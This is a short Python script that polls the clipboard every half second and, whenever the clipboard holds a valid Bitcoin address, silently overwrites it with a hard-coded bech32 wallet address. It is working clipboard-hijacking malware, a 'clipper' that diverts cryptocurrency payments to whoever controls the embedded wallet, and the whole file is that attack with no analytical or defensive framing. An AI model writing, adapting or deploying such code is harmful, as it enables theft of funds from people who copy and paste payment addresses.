import clipboard
import bech32
import coinaddr
import time

addresses = [
    {
        "btc" : "bc1qlq9sjulr4warad2x6s0h35nus07l8g3dhdrl69",
    }
]


def verify_btc(clip):
    if (bech32.bech32_decode(clip) != (None, None)):
        clipboard.copy(addresses[0]["btc"])
    else:
        
        try:
            byteAddr = str.encode(clip)
            coinaddr.validate('btc', byteAddr)
            clipboard.copy(addresses[0]["btc"])
        except ValueError:
            return 0


def process():
    try:
        clip = clipboard.paste()
        verify_btc(clip)
       
    except Exception as e:
        pass
   
    

while True:
    
    process()
    time.sleep(0.5)

    
    